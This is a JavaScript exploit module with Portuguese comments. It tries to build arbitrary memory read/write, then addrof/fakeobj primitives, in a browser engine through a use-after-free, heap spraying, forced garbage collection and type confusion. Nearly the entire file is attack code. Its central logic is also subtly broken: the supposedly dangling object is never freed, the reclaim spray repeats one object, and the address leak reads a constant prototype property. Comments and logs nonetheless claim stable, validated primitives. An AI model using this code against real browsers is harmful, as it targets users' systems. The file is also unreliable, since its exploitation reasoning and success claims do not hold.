// js/script3/testArrayBufferVictimCrash.mjs (Revisão Robusta)
// Foco: Criação de R/W arbitrário para construir addrof/fakeobj estáveis.

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais para as Primitivas ---
// Estas serão inicializadas pelo UAF e usadas pelas funções de acesso à memória.
let victim_array;
let original_victim_butterfly;
let container_array_butterfly_addr;

// Função auxiliar para converter de e para double
const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};

const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// =======================================================================================
// Primitivas de Leitura/Escrita Arbitrária (Construídas via UAF)
// =======================================================================================

function arb_write(where, what) {
    // 1. Corrompe o ponteiro de dados ('butterfly') do nosso array 'victim'
    //    para que ele aponte para o endereço 'where' - 8 bytes.
    //    O offset de -8 é necessário porque o acesso ao elemento [0] já considera o cabeçalho.
    container_array_butterfly_addr[2] = itof(where.sub(8));
    
    // 2. Escreve o valor 'what' no endereço alvo através do array victim.
    victim_array[0] = itof(what);

    // 3. Restaura o ponteiro original para evitar crashes.
    container_array_butterfly_addr[2] = itof(original_victim_butterfly);
}

function arb_read(where) {
    // 1. Corrompe o ponteiro de dados ('butterfly') para apontar para o endereço alvo.
    container_array_butterfly_addr[2] = itof(where.sub(8));
    
    // 2. Lê o valor do endereço alvo através do array.
    const result = victim_array[0];

    // 3. Restaura o ponteiro original.
    container_array_butterfly_addr[2] = itof(original_victim_butterfly);

    return ftoi(result);
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Robusta (R/W Arbitrário) ---`, "test");

    try {
        // --- FASE 1: Construir Leitura/Escrita Arbitrária via UAF ---
        logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        createArbitraryRW();
        logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Construir e Validar addrof/fakeobj ---
        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");

        const leaker_arr = [{}]; // Um array para nos ajudar a vazar endereços
        const leaker_addr = arb_read(ftoi(leaker_arr.a).add(16)); // Endereço do butterfly do leaker
        
        const addrof = (obj) => {
            leaker_arr[0] = obj;
            return arb_read(leaker_addr);
        };

        const fakeobj = (addr) => {
            arb_write(leaker_addr, addr);
            return leaker_arr[0];
        };

        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        // Validação
        const test_obj = { marker: 0x41414141 };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0x41414141) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }

        document.title = "addrof/fakeobj SUCCESS!";
        return { success: true, message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!" };

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função que estabelece a confusão de tipos para criar R/W Arbitrário ---
function createArbitraryRW() {
    // Spray de objetos para preparar o heap
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push({ a: 1, b: 2, c: 3, d: 4 });
    }

    // O objeto que se tornará nosso ponteiro pendurado
    let dangling_ref_obj = { a: 1, b: 2, c: 3, d: 4 };
    spray.push(dangling_ref_obj);

    // Variáveis que usaremos para a exploração
    victim_array = new Float64Array([13.37, 13.38]);
    let container = {
        header: 0,
        butterfly: victim_array
    };
    
    // Libera a referência principal, tornando os objetos elegíveis para GC
    spray = null;
    triggerGC();

    // Spray de Reclamação: Tentamos alocar nosso objeto 'container' na memória liberada.
    let reclaimers = [];
    for (let i = 0; i < 4096; i++) {
        reclaimers.push(container);
    }
    
    // O ponteiro 'dangling_ref_obj' agora aponta para um dos objetos 'container'
    // O JS pensa que é {a,b,c,d}, mas na verdade é {header, butterfly}.
    // A propriedade 'a' agora se sobrepõe à 'header' e 'b' se sobrepõe à 'butterfly'.
    
    // Vazamos os ponteiros através da confusão de tipos
    container_array_butterfly_addr = dangling_ref_obj.b;
    original_victim_butterfly = ftoi(container_array_butterfly_addr[2]);
}

function triggerGC() {
    try {
        for (let i = 0; i < 64; i++) {
            new ArrayBuffer(1024 * 1024 * 16); // Aloca e libera 1GB no total para forçar GC
        }
    } catch(e) {}
}

// Propriedade 'a' de um objeto {a,b...} sobrepõe-se ao butterfly de um array [a,b...]
// se o UAF for bem-sucedido. Precisamos de um objeto e um array no UAF.
// A forma mais estável é: UAF com {a,b,c,d} e {header, butterfly:Float64Array}
// dangling_ref.b agora é o ponteiro para o Float64Array
// Isso nos dá a capacidade de corromper o butterfly.
Array.prototype.a = 13.37;
